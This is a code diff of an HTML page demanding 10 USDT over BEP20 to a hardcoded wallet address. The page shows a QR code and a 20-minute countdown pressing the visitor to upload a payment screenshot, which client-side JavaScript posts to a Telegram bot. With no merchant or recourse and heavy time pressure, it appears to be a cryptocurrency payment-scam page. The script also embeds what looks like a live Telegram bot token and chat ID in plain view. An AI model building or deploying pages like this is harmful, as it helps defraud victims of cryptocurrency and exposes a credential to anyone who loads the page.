@@ -2,126 +2,161 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Confirm Payment</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT Payment</title>
   <style>
-    * {
-      margin: 0; padding: 0; box-sizing: border-box;
-    }
-    body, html {
-      height: 100%;
-      font-family: sans-serif;
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Arial', sans-serif;
       color: white;
-      background: black;
-      overflow: hidden;
-      position: relative;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
+
     .container {
-      background-color: rgba(0,0,0,0.75);
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 20px;
-      padding: 20px;
-      width: 85%;
-      max-width: 350px;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      box-shadow: 0 0 15px #00aaff;
+      padding: 30px 20px;
       text-align: center;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
     }
-    img#confirmImg {
-      width: 100%;
-      border-radius: 15px;
-      margin-bottom: 15px;
-      user-select: none;
+
+    .qr {
+      margin: 20px 0;
     }
-    #addressBox {
-      background: #111;
-      border-radius: 10px;
+
+    .address-box {
+      background-color: rgba(0,0,0,0.4);
       padding: 12px;
-      font-size: 1rem;
-      margin-bottom: 20px;
-      cursor: pointer;
-      user-select: all;
-      word-break: break-all;
-      box-shadow: 0 0 8px #00aaff;
-    }
-    #payBtn {
-      width: 100%;
-      padding: 10px;
-      background-color: #00aaff;
-      border: none;
       border-radius: 10px;
-      color: white;
-      font-size: 1rem;
+      word-wrap: break-word;
+      font-size: 14px;
+    }
+
+    button {
+      margin-top: 10px;
+      background-color: #00bcd4;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 8px;
       cursor: pointer;
-      margin-bottom: 10px;
+      color: white;
+      font-weight: bold;
     }
-    #loadingBar {
-      height: 5px;
-      background-color: #00aaff;
-      width: 0%;
-      transition: width 1s linear;
-      margin-bottom: 15px;
+
+    button:hover {
+      background-color: #0097a7;
+    }
+
+    input[type="file"] {
       display: none;
-      border-radius: 5px;
     }
-    #note {
-      font-size: 0.9rem;
-      color: #00aaff;
-      font-style: italic;
+
+    #countdown {
+      font-size: 16px;
+      margin: 10px 0;
+      color: #ffcc00;
+    }
+
+    .screenshot-title {
+      margin-top: 25px;
+      font-size: 15px;
+      color: #ff8888;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img id="confirmImg" src="image.jpg" alt="Confirm Payment Image" />
-    <div id="addressBox" title="Click to copy address">Loading address...</div>
-    <button id="payBtn">Loading...</button>
-    <div id="loadingBar"></div>
-    <div id="note">make sure that you choose BEP20</div>
+
+<div class="container">
+  <h2> Pay 10 USDT( ONLY BEP20)</h2>
+  <p>MAKE PAYMENT WITH BEP20 , please pay to the following address:</p>
+
+  <div class="qr">
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0x9B767999d83651c244D2225A910a3a2456c98a3c" alt="QR Code">
   </div>
 
-  <script>
-    const addressBox = document.getElementById("addressBox");
-    const payBtn = document.getElementById("payBtn");
-    const loadingBar = document.getElementById("loadingBar");
+  <div class="address-box" id="wallet-address">0x9B767999d83651c244D2225A910a3a2456c98a3c</div>
+  <button onclick="copyAddress()">Copy Address</button>
 
-    const amount = localStorage.getItem("amount") || "5000";
-    const walletAddress = localStorage.getItem("wallet") || "0xce30609924e6caad026b897071df83b1fe7b589b";
-    addressBox.textContent = walletAddress;
+  <div class="screenshot-title">after payment upload a screenshot of the payment before the countdown ends</div>
+  <div id="countdown">19:59</div>
 
-    payBtn.textContent = "Pay the required amount";
+  <button onclick="document.getElementById('screenshot').click()">Payment Done</button>
+  <input type="file" id="screenshot" accept="image/*" onchange="sendToTelegram()">
+</div>
 
-    addressBox.addEventListener("click", () => {
-      navigator.clipboard.writeText(walletAddress).then(() => {
-        alert("Address copied: " + walletAddress);
-      }).catch(() => {
-        alert("Failed to copy");
-      });
+<script>
+  function copyAddress() {
+    const address = document.getElementById("wallet-address").textContent;
+    navigator.clipboard.writeText(address).then(() => {
+      alert("Address copied!");
     });
+  }
 
-    payBtn.addEventListener("click", () => {
-      payBtn.disabled = true;
-      payBtn.textContent = "You have to pay in 3 minutes";
-      loadingBar.style.display = "block";
-      loadingBar.style.width = "0%";
+  function sendToTelegram() {
+    const fileInput = document.getElementById('screenshot');
+    const file = fileInput.files[0];
+    if (!file) return;
 
-      let progress = 0;
-      const duration = 180; // 3 دقائق بالثواني
-      const intervalTime = 1000; // تحديث كل ثانية
+    const botToken = "8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw";
+    const chatId = "7739393558";
 
-      const interval = setInterval(() => {
-        progress++;
-        const percent = (progress / duration) * 100;
-        loadingBar.style.width = percent + "%";
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("caption", "Payment screenshot (10 USDT - BEP20)");
+    formData.append("photo", file);
 
-        if (progress >= duration) {
-          clearInterval(interval);
-          alert("Countdown finished!");
-        }
-      }, intervalTime);
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        alert("Screenshot sent successfully.");
+      } else {
+        alert("Sending failed. Try again.");
+      }
+    })
+    .catch(error => {
+      console.error(error);
+      alert("An error occurred while sending.");
     });
-  </script>
+  }
+
+  // Countdown logic
+  let minutes = 19;
+  let seconds = 59;
+  const countdownElement = document.getElementById("countdown");
+
+  const countdown = setInterval(() => {
+    if (seconds === 0) {
+      if (minutes === 0) {
+        clearInterval(countdown);
+        countdownElement.textContent = "Time expired";
+        countdownElement.style.color = "red";
+        return;
+      }
+      minutes--;
+      seconds = 59;
+    } else {
+      seconds--;
+    }
+
+    const formatted =
+      String(minutes).padStart(2, "0") + ":" + String(seconds).padStart(2, "0");
+    countdownElement.textContent = formatted;
+  }, 1000);
+</script>
+
 </body>
 </html>
